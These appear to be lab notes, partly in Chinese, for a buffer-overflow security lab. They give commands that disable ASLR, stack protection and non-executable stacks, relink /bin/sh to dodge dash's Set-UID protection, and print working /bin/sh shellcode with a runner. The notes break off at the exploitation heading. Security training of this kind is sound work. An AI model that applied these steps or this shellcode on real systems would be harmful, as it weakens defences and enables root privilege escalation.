## 2.1 Turning off countermeasures

`sudo sysctl -w kernel.randomize_va_space=0`

`gcc -fno-stack-protector example.c`

`gcc -z execstack -o test test.c`或`gcc -z noexecstack -o test test.c`

**For Set-UID program**

dash对Set-UID存在反制措施.

```shell
sudo rm /bin/sh
sudo ln -s /bin/zsh /bin/sh
```

## 2.2 Running Shellcode

```c
#include <stdio.h>

int main()
{
	char *name[2];
	name[0] = "/bin/sh";
	name[1] = NULL;
	execve(name[0], name, NULL);
}

```

```c
/* call_shellcode.c */
/* You can get this program from the lab’s website */
/* A program that launches a shell using shellcode */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
const char code[] =
	"\x31\xc0" /* Line 1: xorl %eax,%eax */
	"\x50" /* Line 2: pushl %eax */
	"\x68""//sh" /* Line 3: pushl $0x68732f2f */
	"\x68""/bin" /* Line 4: pushl $0x6e69622f */
	"\x89\xe3" /* Line 5: movl %esp,%ebx */
	"\x50" /* Line 6: pushl %eax */
	"\x53" /* Line 7: pushl %ebx */
	"\x89\xe1" /* Line 8: movl %esp,%ecx */
	"\x99" /* Line 9: cdq */
	"\xb0\x0b" /* Line 10: movb $0x0b,%al */
	"\xcd\x80" /* Line 11: int $0x80 */
;

int main(int argc, char **argv)
{
	char buf[sizeof(code)];
	strcpy(buf, code);
	((void(*)( ))buf)( );
}

```

32位Linux系统调用规则,`ebx,ecx,edx,esi,edi`分别传递参数.系统调用编号记录在al中

`gcc -z execstack -o call_shellcode call_shellcode.c`

## 2.3 The vulnerable program

`-fno-stack-protector -z execstack`

Change the program to be a Set-UID program.

```shell
sudo chown root stack
sudo chmod 4755 stack
```

## 2.4 Exploiting the Vulnerability

